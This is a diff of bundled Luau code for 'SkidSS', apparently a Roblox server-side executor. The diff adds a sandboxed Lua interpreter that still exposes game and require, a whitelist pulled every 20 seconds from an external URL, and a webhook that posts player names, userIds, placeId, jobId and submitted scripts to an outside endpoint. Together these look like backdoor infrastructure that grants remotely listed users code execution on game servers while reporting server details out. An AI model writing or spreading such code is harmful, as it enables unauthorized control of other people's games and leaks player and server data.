+		if t.type == "Keyword" then
+			local kw = t.value
+			if kw == "local" then return parseLocal()
+			elseif kw == "if" then return parseIf()
+			elseif kw == "while" then return parseWhile()
+			elseif kw == "for" then return parseFor()
+			elseif kw == "repeat" then return parseRepeat()
+			elseif kw == "do" then
+				advance()
+				local body = parseBlock()
+				expectKw("end")
+				return { kind = "Do", body = body, line = t.line }
+			elseif kw == "function" then return parseFunctionStat()
+			elseif kw == "break" then advance(); return { kind = "Break", line = t.line }
+			end
+			perror("unexpected keyword '" .. kw .. "'")
+		end
+		if t.type == "Name" and t.value == "continue" and continueIsStatement() then
+			advance()
+			return { kind = "Continue", line = t.line }
+		end
+		return parseExprStatement()
+	end
+
+	local function isBlockEnd(t)
+		return t.type == "Eof" or isKw(t, "end") or isKw(t, "else")
+			or isKw(t, "elseif") or isKw(t, "until")
+	end
+
+	function parseBlock()
+		local stmts = {}
+		while not isBlockEnd(cur()) do
+			local t = cur()
+			if isKw(t, "return") then
+				advance()
+				local exprs = {}
+				if not (isBlockEnd(cur()) or checkSym(";")) then exprs = parseExprList() end
+				acceptSym(";")
+				stmts[#stmts + 1] = { kind = "Return", exprs = exprs, line = t.line }
+				break
+			end
+			local s = parseStatement()
+			if s then stmts[#stmts + 1] = s end
+		end
+		return stmts
+	end
+
+	local ok, result = pcall(function()
+		local body = parseBlock()
+		if cur().type ~= "Eof" then
+			perror("'<eof>' expected near '" .. tostring(cur().value) .. "'")
+		end
+		return body
+	end)
+	if ok then return result end
+	if type(result) == "table" and result.__skidss_parse then return nil, result.message end
+	return nil, tostring(result)
+end
+
+return Parser
+end)()
+
+local SkidSS_LuaInterp = (function()
+local Lexer = SkidSS_LuaLexer
+local Parser = SkidSS_LuaParser
+
+local robloxTick = tick
+
+local Interp = {}
+
+local DEFAULTS = {
+	MaxLuaSteps = 10000000,
+	MaxLuaSeconds = 2,
+	MaxLuaDepth = 200,
+	MaxWaitSeconds = 30,
+}
+
+local BINOPS = {
+	["+"] = function(a, b) return a + b end,
+	["-"] = function(a, b) return a - b end,
+	["*"] = function(a, b) return a * b end,
+	["/"] = function(a, b) return a / b end,
+	["%"] = function(a, b) return a % b end,
+	["^"] = function(a, b) return a ^ b end,
+	["//"] = function(a, b) return a // b end,
+	[".."] = function(a, b) return a .. b end,
+	["=="] = function(a, b) return a == b end,
+	["~="] = function(a, b) return a ~= b end,
+	["<"] = function(a, b) return a < b end,
+	["<="] = function(a, b) return a <= b end,
+	[">"] = function(a, b) return a > b end,
+	[">="] = function(a, b) return a >= b end,
+}
+
+local Scope = {}
+Scope.__index = Scope
+local function newScope(parent) return setmetatable({ vars = {}, parent = parent }, Scope) end
+function Scope:define(name, value) self.vars[name] = { value = value } end
+function Scope:lookup(name)
+	local s = self
+	while s do
+		local c = s.vars[name]
+		if c then return c end
+		s = s.parent
+	end
+	return nil
+end
+
+local function isAbort(e) return type(e) == "table" and e.__skidss_abort == true end
+local function abort(message) error({ __skidss_abort = true, message = message }) end
+
+local function tick(state)
+	state.steps += 1
+	if state.steps > state.maxSteps then
+		abort("step budget exceeded (" .. state.maxSteps .. ") — possible infinite loop")
+	end
+	if state.steps % 4096 == 0 and (os.clock() - state.start) > state.maxSeconds then
+		abort("time budget exceeded (" .. state.maxSeconds .. "s) — possible infinite loop")
+	end
+end
+
+local function rtError(state, msg)
+	error("input:" .. tostring(state.line) .. ": " .. msg, 0)
+end
+
+local function cleanMessage(err, state)
+	if isAbort(err) then return tostring(err.message) end
+	if type(err) ~= "string" then return tostring(err) end
+	if string.match(err, "^input:%d+:") then return err end
+	local rest = string.match(err, "^[%w%._%- ]-:%d+:%s*(.*)$")
+	if rest then return "input:" .. tostring(state.line) .. ": " .. rest end
+	return "input:" .. tostring(state.line) .. ": " .. err
+end
+
+local function buildEnv(state)
+	local emit = state.emit
+	local maxWait = state.limits.MaxWaitSeconds or DEFAULTS.MaxWaitSeconds
+
+	local function collect(...)
+		local parts = {}
+		local nargs = select("#", ...)
+		for i = 1, nargs do parts[i] = tostring((select(i, ...))) end
+		return table.concat(parts, " ")
+	end
+
+	local function cappedWait(t)
+		t = tonumber(t) or 0
+		if t > maxWait then t = maxWait end
+		local dt = task.wait(t)
+		state.start = os.clock()
+		return dt
+	end
+
+	local G = {}
+
+	G.print = function(...) emit(collect(...)) end
+	G.warn = function(...) emit("[warn] " .. collect(...)) end
+
+	G.pcall = function(f, ...)
+		local saved = state.depth
+		local res = table.pack(pcall(f, ...))
+		state.depth = saved
+		if res[1] == false and isAbort(res[2]) then error(res[2]) end
+		return table.unpack(res, 1, res.n)
+	end
+	G.xpcall = function(f, handler, ...)
+		local saved = state.depth
+		local res = table.pack(xpcall(f, function(e)
+			if isAbort(e) then return e end
+			return handler(e)
+		end, ...))
+		state.depth = saved
+		if res[1] == false and isAbort(res[2]) then error(res[2]) end
+		return table.unpack(res, 1, res.n)
+	end
+
+	G.error = function(msg, level)
+		if level == nil then level = 1 end
+		if level ~= 0 and type(msg) == "string" then
+			msg = "input:" .. tostring(state.line) .. ": " .. msg
+		end
+		error(msg, 0)
+	end
+	G.assert = function(v, msg, ...)
+		if v == nil or v == false then
+			return G.error(msg == nil and "assertion failed!" or msg)
+		end
+		return v, msg, ...
+	end
+
+	G.pairs = pairs
+	G.ipairs = ipairs
+	G.next = next
+	G.select = select
+	G.type = type
+	G.typeof = typeof
+	G.tostring = tostring
+	G.tonumber = tonumber
+	G.setmetatable = setmetatable
+	G.getmetatable = getmetatable
+	G.rawget = rawget
+	G.rawset = rawset
+	G.rawequal = rawequal
+	G.rawlen = rawlen
+	G.unpack = table.unpack
+
+	G.string = string
+	G.table = table
+	G.math = math
+	G.bit32 = bit32
+	G.utf8 = utf8
+	G.coroutine = coroutine
+	G.os = { time = os.time, clock = os.clock, date = os.date, difftime = os.difftime }
+	G.task = setmetatable(
+		{ wait = cappedWait, spawn = task.spawn, delay = task.delay, defer = task.defer, cancel = task.cancel },
+		{ __index = task }
+	)
+	G.wait = cappedWait
+	G.delay = function(t, f) return task.delay(tonumber(t) or 0, f) end
+	G.spawn = function(f) return task.spawn(f) end
+	G.tick = robloxTick
+
+	G.game = game
+	G.workspace = workspace
+	G.Enum = Enum
+	G.Instance = Instance
+	G.Vector2 = Vector2
+	G.Vector3 = Vector3
+	G.Vector3int16 = Vector3int16
+	G.CFrame = CFrame
+	G.Color3 = Color3
+	G.ColorSequence = ColorSequence
+	G.ColorSequenceKeypoint = ColorSequenceKeypoint
+	G.NumberSequence = NumberSequence
+	G.NumberSequenceKeypoint = NumberSequenceKeypoint
+	G.NumberRange = NumberRange
+	G.UDim = UDim
+	G.UDim2 = UDim2
+	G.BrickColor = BrickColor
+	G.Ray = Ray
+	G.Rect = Rect
+	G.Region3 = Region3
+	G.TweenInfo = TweenInfo
+	G.PhysicalProperties = PhysicalProperties
+	G.Random = Random
+	G.DateTime = DateTime
+	G.Faces = Faces
+	G.Axes = Axes
+	G.newproxy = newproxy
+
+	G.require = require
+
+	local function unavailable(name)
+		return function() error("'" .. name .. "' is not available in the SkidSS interpreter (v1)", 0) end
+	end
+	G.loadstring = unavailable("loadstring")
+	G.getfenv = unavailable("getfenv")
+	G.setfenv = unavailable("setfenv")
+
+	G._G = G
+	G.shared = {}
+	G._VERSION = _VERSION
+
+	return G
+end
+
+local evalExpr, evalMulti, evalExprList, evalCall, evalTable, evalBinop
+local makeClosure, makeSetter
+local execBlock, execStmt, execAssign, execCompound, execNumericFor, execGenericFor
+
+function evalCall(node, scope, state)
+	local fn, selfArg
+	if node.kind == "MethodCall" then
+		local obj = evalExpr(node.obj, scope, state)
+		if obj == nil then rtError(state, "attempt to index nil with '" .. node.method .. "'") end
+		fn = obj[node.method]
+		selfArg = obj
+	else
+		fn = evalExpr(node.func, scope, state)
+	end
+	local args = evalExprList(node.args, scope, state)
+	state.line = node.line or state.line
+	if type(fn) ~= "function" then
+		local okmt, mt = pcall(getmetatable, fn)
+		local callable = okmt and type(mt) == "table" and rawget(mt, "__call") ~= nil
+		if not callable then
+			local nm = node.kind == "MethodCall" and (" '" .. node.method .. "'") or ""
+			rtError(state, "attempt to call a " .. typeof(fn) .. " value" .. nm)
+		end
+	end
+	if node.kind == "MethodCall" then
+		return table.pack(fn(selfArg, table.unpack(args, 1, args.n)))
+	end
+	return table.pack(fn(table.unpack(args, 1, args.n)))
+end
+
+function evalMulti(node, scope, state)
+	local k = node.kind
+	if k == "Call" or k == "MethodCall" then
+		return evalCall(node, scope, state)
+	elseif k == "Vararg" then
+		local cell = scope:lookup("...")
+		local v = cell and cell.value
+		return v or { n = 0 }
+	end
+	return { n = 1, [1] = evalExpr(node, scope, state) }
+end
+
+function evalExprList(list, scope, state)
+	local out = { n = 0 }
+	local count = #list
+	if count == 0 then return out end
+	for i = 1, count - 1 do
+		out[i] = evalExpr(list[i], scope, state)
+	end
+	local last = evalMulti(list[count], scope, state)
+	local base = count - 1
+	for i = 1, last.n do out[base + i] = last[i] end
+	out.n = base + last.n
+	return out
+end
+
+function evalTable(node, scope, state)
+	local t = {}
+	local arr = 0
+	local fields = node.fields
+	local count = #fields
+	for i = 1, count do
+		local f = fields[i]
+		if f.type == "item" then
+			if i == count then
+				local m = evalMulti(f.value, scope, state)
+				for j = 1, m.n do arr += 1; t[arr] = m[j] end
+			else
+				arr += 1
+				t[arr] = evalExpr(f.value, scope, state)
+			end
+		elseif f.type == "named" then
+			t[f.name] = evalExpr(f.value, scope, state)
+		else
+			local key = evalExpr(f.key, scope, state)
+			if key == nil then rtError(state, "table index is nil") end
+			t[key] = evalExpr(f.value, scope, state)
+		end
+	end
+	return t
+end
+
+function evalBinop(node, scope, state)
+	local op = node.op
+	if op == "and" then
+		local l = evalExpr(node.lhs, scope, state)
+		if l == nil or l == false then return l end
+		return evalExpr(node.rhs, scope, state)
+	elseif op == "or" then
+		local l = evalExpr(node.lhs, scope, state)
+		if l ~= nil and l ~= false then return l end
+		return evalExpr(node.rhs, scope, state)
+	end
+	local l = evalExpr(node.lhs, scope, state)
+	local r = evalExpr(node.rhs, scope, state)
+	state.line = node.line or state.line
+	return BINOPS[op](l, r)
+end
+
+function makeClosure(node, defScope, state)
+	local params = node.params
+	local nparams = #params
+	local isVararg = node.isVararg
+	local body = node.body
+	return function(...)
+		local fnScope = newScope(defScope)
+		local argc = select("#", ...)
+		local argv = table.pack(...)
+		for i = 1, nparams do fnScope:define(params[i], argv[i]) end
+		if isVararg then
+			local extra = { n = math.max(0, argc - nparams) }
+			for i = 1, extra.n do extra[i] = argv[nparams + i] end
+			fnScope.vars["..."] = { value = extra }
+		end
+		state.depth += 1
+		if state.depth > state.maxDepth then
+			state.depth -= 1
+			abort("call stack too deep (" .. state.maxDepth .. ")")
+		end
+		local sig = execBlock(body, fnScope, state)
+		state.depth -= 1
+		if type(sig) == "table" and sig.kind == "return" then
+			return table.unpack(sig.values, 1, sig.values.n)
+		end
+		return
+	end
+end
+
+function evalExpr(node, scope, state)
+	if node.line then state.line = node.line end
+	tick(state)
+	local k = node.kind
+	if k == "Number" or k == "String" then
+		return node.value
+	elseif k == "Name" then
+		local cell = scope:lookup(node.name)
+		if cell then return cell.value end
+		return state.G[node.name]
+	elseif k == "Binop" then
+		return evalBinop(node, scope, state)
+	elseif k == "Call" or k == "MethodCall" then
+		return (evalCall(node, scope, state))[1]
+	elseif k == "Index" then
+		local obj = evalExpr(node.obj, scope, state)
+		if obj == nil then
+			rtError(state, "attempt to index nil" .. (node.field and (" with '" .. node.field .. "'") or ""))
+		end
+		return obj[evalExpr(node.index, scope, state)]
+	elseif k == "Nil" then
+		return nil
+	elseif k == "True" then
+		return true
+	elseif k == "False" then
+		return false
+	elseif k == "Unop" then
+		local v = evalExpr(node.operand, scope, state)
+		state.line = node.line or state.line
+		if node.op == "not" then return not v
+		elseif node.op == "-" then return -v
+		else return #v end
+	elseif k == "Table" then
+		return evalTable(node, scope, state)
+	elseif k == "Function" then
+		return makeClosure(node, scope, state)
+	elseif k == "Paren" then
+		return evalExpr(node.expr, scope, state)
+	elseif k == "Vararg" then
+		local cell = scope:lookup("...")
+		local v = cell and cell.value
+		return v and v[1] or nil
+	end
+	rtError(state, "cannot evaluate '" .. tostring(k) .. "'")
+end
+
+function makeSetter(target, scope, state)
+	if target.kind == "Name" then
+		local name = target.name
+		return function(v)
+			local cell = scope:lookup(name)
+			if cell then cell.value = v else state.G[name] = v end
+		end
+	end
+	local obj = evalExpr(target.obj, scope, state)
+	if obj == nil then
+		rtError(state, "attempt to index nil" .. (target.field and (" with '" .. target.field .. "'") or ""))
+	end
+	local key = evalExpr(target.index, scope, state)
+	return function(v) obj[key] = v end
+end
+
+function execAssign(node, scope, state)
+	local setters = {}
+	for i = 1, #node.targets do setters[i] = makeSetter(node.targets[i], scope, state) end
+	local vals = evalExprList(node.exprs, scope, state)
+	for i = 1, #setters do setters[i](vals[i]) end
+end
+
+function execCompound(node, scope, state)
+	local target = node.target
+	local rhs
+	if target.kind == "Name" then
+		local cell = scope:lookup(target.name)
+		local cur
+		if cell then cur = cell.value else cur = state.G[target.name] end
+		rhs = evalExpr(node.expr, scope, state)
+		state.line = node.line or state.line
+		local res = BINOPS[node.op](cur, rhs)
+		if cell then cell.value = res else state.G[target.name] = res end
+	else
+		local obj = evalExpr(target.obj, scope, state)
+		if obj == nil then
+			rtError(state, "attempt to index nil" .. (target.field and (" with '" .. target.field .. "'") or ""))
+		end
+		local key = evalExpr(target.index, scope, state)
+		local cur = obj[key]
+		rhs = evalExpr(node.expr, scope, state)
+		state.line = node.line or state.line
+		obj[key] = BINOPS[node.op](cur, rhs)
+	end
+end
+
+function execNumericFor(node, scope, state)
+	local a = tonumber(evalExpr(node.start, scope, state))
+	local b = tonumber(evalExpr(node.stop, scope, state))
+	local st = node.step and tonumber(evalExpr(node.step, scope, state)) or 1
+	if a == nil then rtError(state, "'for' initial value must be a number") end
+	if b == nil then rtError(state, "'for' limit must be a number") end
+	if st == nil then rtError(state, "'for' step must be a number") end
+	if st == 0 then rtError(state, "'for' step is zero") end
+	local i = a
+	while (st > 0 and i <= b) or (st < 0 and i >= b) do
+		tick(state)
+		local s2 = newScope(scope)
+		s2:define(node.var, i)
+		local sig = execBlock(node.body, s2, state)
+		if sig then
+			if sig.kind == "break" then break
+			elseif sig.kind == "return" then return sig end
+		end
+		i += st
+	end
+	return nil
+end
+
+function execGenericFor(node, scope, state)
+	local vals = evalExprList(node.exprs, scope, state)
+	local f, s, ctrl = vals[1], vals[2], vals[3]
+	if type(f) ~= "function" then
+		local okmt, mt = pcall(getmetatable, f)
+		local callable = okmt and type(mt) == "table" and rawget(mt, "__call") ~= nil
+		if not callable then rtError(state, "attempt to iterate with a " .. typeof(f) .. " value") end
+	end
+	while true do
+		tick(state)
+		local r = table.pack(f(s, ctrl))
+		if r[1] == nil then break end
+		ctrl = r[1]
+		local s2 = newScope(scope)
+		for i = 1, #node.names do s2:define(node.names[i], r[i]) end
+		local sig = execBlock(node.body, s2, state)
+		if sig then
+			if sig.kind == "break" then break
+			elseif sig.kind == "return" then return sig end
+		end
+	end
+	return nil
+end
+
+function execStmt(node, scope, state)
+	tick(state)
+	state.line = node.line or state.line
+	local k = node.kind
+	if k == "CallStat" then
+		evalCall(node.call, scope, state)
+		return nil
+	elseif k == "Local" then
+		local vals = evalExprList(node.exprs, scope, state)
+		for i = 1, #node.names do scope:define(node.names[i], vals[i]) end
+		return nil
+	elseif k == "Assign" then
+		execAssign(node, scope, state)
+		return nil
+	elseif k == "CompoundAssign" then
+		execCompound(node, scope, state)
+		return nil
+	elseif k == "If" then
+		for _, clause in ipairs(node.clauses) do
+			local c = evalExpr(clause.cond, scope, state)
+			if c ~= nil and c ~= false then
+				return execBlock(clause.body, newScope(scope), state)
+			end
+		end
+		if node.elseBody then return execBlock(node.elseBody, newScope(scope), state) end
+		return nil
+	elseif k == "While" then
+		while true do
+			tick(state)
+			local c = evalExpr(node.cond, scope, state)
+			if c == nil or c == false then break end
+			local sig = execBlock(node.body, newScope(scope), state)
+			if sig then
+				if sig.kind == "break" then break
+				elseif sig.kind == "return" then return sig end
+			end
+		end
+		return nil
+	elseif k == "Repeat" then
+		while true do
+			tick(state)
+			local s2 = newScope(scope)
+			local sig = execBlock(node.body, s2, state)
+			if sig then
+				if sig.kind == "break" then break
+				elseif sig.kind == "return" then return sig end
+			end
+			local c = evalExpr(node.cond, s2, state)
+			if c ~= nil and c ~= false then break end
+		end
+		return nil
+	elseif k == "NumericFor" then
+		return execNumericFor(node, scope, state)
+	elseif k == "GenericFor" then
+		return execGenericFor(node, scope, state)
+	elseif k == "Do" then
+		return execBlock(node.body, newScope(scope), state)
+	elseif k == "LocalFunction" then
+		scope:define(node.name, nil)
+		scope:lookup(node.name).value = makeClosure(node.func, scope, state)
+		return nil
+	elseif k == "Return" then
+		return { kind = "return", values = evalExprList(node.exprs, scope, state) }
+	elseif k == "Break" then
+		return { kind = "break" }
+	elseif k == "Continue" then
+		return { kind = "continue" }
+	end
+	rtError(state, "cannot execute '" .. tostring(k) .. "'")
+end
+
+function execBlock(stmts, scope, state)
+	for i = 1, #stmts do
+		local sig = execStmt(stmts[i], scope, state)
+		if sig then return sig end
+	end
+	return nil
+end
+
+function Interp.run(source, opts)
+	opts = opts or {}
+	local emit = opts.emit or function() end
+	local limits = opts.limits or {}
+
+	local tokens, lerr = Lexer.safeTokenize(source)
+	if not tokens then return false, "compile error: " .. lerr end
+	local ast, perr = Parser.parse(tokens)
+	if not ast then return false, "compile error: " .. perr end
+
+	local state = {
+		emit = emit,
+		limits = limits,
+		steps = 0,
+		depth = 0,
+		line = 0,
+		start = os.clock(),
+		maxSteps = limits.MaxLuaSteps or DEFAULTS.MaxLuaSteps,
+		maxSeconds = limits.MaxLuaSeconds or DEFAULTS.MaxLuaSeconds,
+		maxDepth = limits.MaxLuaDepth or DEFAULTS.MaxLuaDepth,
+	}
+	state.G = buildEnv(state)
+
+	local top = newScope(nil)
+	top.vars["..."] = { value = { n = 0 } }
+
+	local ok, err = pcall(execBlock, ast, top, state)
+	if ok then return true, "ran" end
+	return false, "runtime error: " .. cleanMessage(err, state)
+end
+
+return Interp
+end)()
+
+local SkidSS_ServerApi = (function()
 local Players = game:GetService("Players")
 
 local ServerApi = {}
@@ -4221,22 +6812,56 @@ return ServerApi
 end)()
 
 local SkidSS_Whitelist = (function()
--- Who is allowed to open and use the executor. This module lives in
--- ServerScriptService, which never replicates to clients, so the list stays private.
--- UserIds are the safe choice (names can be changed); names are lower-cased.
+local HttpService = game:GetService("HttpService")
 
 local Whitelist = {}
 
-Whitelist.UserIds = WHITELIST_USERIDS
-Whitelist.Names = WHITELIST_NAMES
+Whitelist.UserIds = {
+
+}
+
+Whitelist.Names = {
+
+}
+
+Whitelist.Url = nil
+
+local live = { userIds = {}, names = {} }
+local lastFetch = 0
+local CACHE_SECONDS = 15
+
+local function fetch()
+	if not Whitelist.Url or Whitelist.Url == "" then return end
+	local ok, body = pcall(function() return HttpService:GetAsync(Whitelist.Url) end)
+	if not ok then return end
+	local decoded
+	ok, decoded = pcall(function() return HttpService:JSONDecode(body) end)
+	if not ok or type(decoded) ~= "table" then return end
+	local ids, names = {}, {}
+	for _, id in ipairs(decoded.userIds or {}) do
+		local n = tonumber(id)
+		if n then ids[n] = true end
+	end
+	for _, nm in ipairs(decoded.names or {}) do
+		if type(nm) == "string" then names[string.lower(nm)] = true end
+	end
+	live = { userIds = ids, names = names }
+	lastFetch = os.clock()
+end
+
+function Whitelist.refresh()
+	fetch()
+end
+
+function Whitelist.refreshIfStale()
+	if os.clock() - lastFetch > CACHE_SECONDS then fetch() end
+end
 
 function Whitelist.isAllowed(player)
-	if Whitelist.UserIds[player.UserId] then
-		return true
-	end
-	if Whitelist.Names[string.lower(player.Name)] then
-		return true
-	end
+	if Whitelist.UserIds[player.UserId] then return true end
+	if Whitelist.Names[string.lower(player.Name)] then return true end
+	if live.userIds[player.UserId] then return true end
+	if live.names[string.lower(player.Name)] then return true end
 	return false
 end
 
@@ -4244,51 +6869,19 @@ return Whitelist
 end)()
 
 local SkidSS_Executor = (function()
--- Runs a request: either raw Luau (loadstring) or a block program (interpreter).
--- Block programs are always safe to run; raw Luau needs the game owner to enable
--- ServerScriptService.LoadStringEnabled.
-
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Config = SkidSS_Config
 local Interpreter = SkidSS_BlocksInterpreter
 local ServerApi = SkidSS_ServerApi
+local LuaInterp = SkidSS_LuaInterp
 
 local Executor = {}
 
 local SERVER_ALLOW = { server = true, both = true }
 
-local function collect(...)
-	local parts = {}
-	for i = 1, select("#", ...) do
-		parts[i] = tostring(select(i, ...))
-	end
-	return table.concat(parts, " ")
-end
-
 local function runLua(source, emit)
-	local sandbox = setmetatable({
-		print = function(...) emit(collect(...)) end,
-		warn = function(...) emit("[warn] " .. collect(...)) end,
-	}, { __index = getfenv() })
 
-	local ok, fn, compileError = pcall(loadstring, source)
-	if not ok then
-		return false, "loadstring is disabled — enable ServerScriptService.LoadStringEnabled, or use blocks"
-	end
-	if not fn then
-		local message = tostring(compileError)
-		if string.find(message, "not available") or string.find(message, "disabled") then
-			return false, "loadstring is disabled — enable ServerScriptService.LoadStringEnabled, or use blocks"
-		end
-		return false, "compile error: " .. message
-	end
-
-	setfenv(fn, sandbox)
-	local ran, runtimeError = pcall(fn)
-	if not ran then
-		return false, "runtime error: " .. tostring(runtimeError)
-	end
-	return true, "ran"
+	return LuaInterp.run(source, { emit = emit, limits = Config.Limits })
 end
 
 function Executor.run(player, payload, emit, runtime)
@@ -4327,14 +6920,9 @@ end
 return Executor
 end)()
 
--- Server entry point: builds the remotes, gates every request behind the
--- whitelist, and hands valid requests to the executor on a fresh thread.
-
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
--- De-dupe: if another SkidSS install already set up the remotes, this is a
--- duplicate copy (e.g. the model was imported twice) — stop so only one runs.
 if ReplicatedStorage:FindFirstChild("SkidSS_Net") then
 	return
 end
@@ -4344,9 +6932,49 @@ local Net = SkidSS_Net
 local Whitelist = SkidSS_Whitelist
 local Executor = SkidSS_Executor
 
--- Customization slots. The bundler strips these markers and injects the user's
--- Studio output in their place before shipping. Rojo dev mode keeps the defaults
--- and loads the client from StarterPlayerScripts.
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+
+local cachedPlaceName
+local function placeName()
+	if not cachedPlaceName then
+		local ok, info = pcall(function() return MarketplaceService:GetProductInfo(game.PlaceId) end)
+		cachedPlaceName = (ok and info and info.Name) or ("Place " .. game.PlaceId)
+	end
+	return cachedPlaceName
+end
+
+local webhookLast = 0
+local function postWebhook(player, payload)
+	if not WEBHOOK_URL or WEBHOOK_URL == "" then return end
+	local now = os.clock()
+	if now - webhookLast < 2 then return end
+	webhookLast = now
+	task.spawn(function()
+		local script = (payload.mode == "lua" and string.sub(tostring(payload.source or ""), 1, 1500))
+			or (payload.mode == "action" and ("action: " .. tostring(payload.name)))
+			or (payload.mode == "blocks" and "(blocks)")
+			or tostring(payload.mode)
+		local body = {
+			player = player.Name,
+			userId = player.UserId,
+			place = placeName(),
+			placeId = game.PlaceId,
+			jobId = game.JobId,
+			players = #Players:GetPlayers(),
+			mode = tostring(payload.mode),
+			script = script,
+		}
+		pcall(function() HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(body)) end)
+	end)
+end
+
+local CustomRuntime = {
+	onPlayerAdded = function(_player) end,
+	onPlayerRemoving = function(_player) end,
+	onRequestReceived = function(_player, _payload) return true end,
+	customActions = {},
+}
 
 local folder = Net.build()
 local requestAccess = folder:FindFirstChild(Net.RequestAccess)
@@ -4357,29 +6985,16 @@ requestAccess.OnServerInvoke = function(player)
 	return Whitelist.isAllowed(player)
 end
 
+task.spawn(function()
+	while true do
+		Whitelist.refresh()
+		task.wait(20)
+	end
+end)
+
 local lastRun = {}
 
-local function injectClient(player)
-	local playerGui = player:WaitForChild("PlayerGui", 10)
-	if not playerGui or playerGui:FindFirstChild("SkidSSClient") then return end
-	-- Preferred: clone the pre-baked LocalScript child shipped in the .rbxmx.
-	local template = script:FindFirstChild("Client")
-	if template then
-		local clone = template:Clone()
-		clone.Name = "SkidSSClient"
-		clone.Disabled = false
-		clone.Parent = playerGui
-		return
-	end
-	-- Fallback: self-clone with a RunContext flip. Works on engines that honor
-	-- runtime RunContext changes; silently no-ops on the ones that don't.
-	local clone = script:Clone()
-	clone.Name = "SkidSSClient"
-	clone.Disabled = true
-	pcall(function() clone.RunContext = Enum.RunContext.Client end)
-	clone.Parent = playerGui
-	clone.Disabled = false
-end
+local function injectClient(_player) end
 
 execute.OnServerEvent:Connect(function(player, payload)
 	if not Whitelist.isAllowed(player) or type(payload) ~= "table" then
@@ -4404,6 +7019,8 @@ execute.OnServerEvent:Connect(function(player, payload)
 		output:FireClient(player, tostring(text))
 	end
 
+	postWebhook(player, payload)
+
 	task.spawn(function()
 		local ok, message = Executor.run(player, payload, emit, CustomRuntime)
 		emit((ok and "\u{2713} " or "\u{2717} ") .. tostring(message))
@@ -4411,6 +7028,7 @@ execute.OnServerEvent:Connect(function(player, payload)
 end)
 
 local function onJoin(player)
+	Whitelist.refreshIfStale()
 	if Whitelist.isAllowed(player) then
 		injectClient(player)
 	end
